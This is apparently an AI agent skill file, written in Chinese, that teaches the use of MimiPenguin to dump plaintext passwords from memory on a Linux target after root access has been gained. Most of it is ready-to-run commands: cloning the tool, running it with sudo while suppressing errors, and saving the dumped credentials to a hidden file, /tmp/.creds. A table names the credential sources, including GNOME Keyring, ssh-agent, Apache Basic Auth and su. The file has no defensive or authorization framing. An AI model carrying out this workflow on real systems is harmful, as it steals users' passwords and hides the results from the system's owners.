---
name: mimipenguin
description: >
  此技能适用于用户询问关于 "mimipenguin"、"在已获得 root 权限的 Linux 目标上从运行进程和内存中提取明文密码"、
  "Linux 内存凭据转储" 的问题。
---

# MimiPenguin

Linux 凭据转储工具 — 从内存提取明文密码（Linux 版 Mimikatz）。

## 快速开始

```bash
# 需要 root 权限
git clone https://github.com/huntergregal/mimipenguin
cd mimipenguin

# Python 版本
sudo python3 mimipenguin.py

# Shell 版本
sudo bash mimipenguin.sh
```

## 可转储的来源

| 来源 | 说明 |
|--------|-------|
| GNOME Keyring | gnome-keyring-daemon 进程的 `/proc/<PID>/mem` |
| VSFTPd | 活跃 FTP 会话凭据 |
| Apache Basic Auth | apache2 进程中的 HTTP 基本认证 |
| SSH | ssh-agent 中的 SSH 口令短语 |
| gdm3 | GNOME 显示管理器登录 |
| su | `su` 进程中的凭据 |

## 常见工作流

**快速转储所有来源：**
```bash
sudo python3 mimipenguin.py 2>/dev/null
```

**Shell 版本（无 Python 依赖）：**
```bash
sudo bash mimipenguin.sh
```

**重定向输出：**
```bash
sudo python3 mimipenguin.py | tee /tmp/.creds
```

> **注意**：有效性取决于正在运行的服务和内存布局。

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | Linux 进程内存转储技术 |
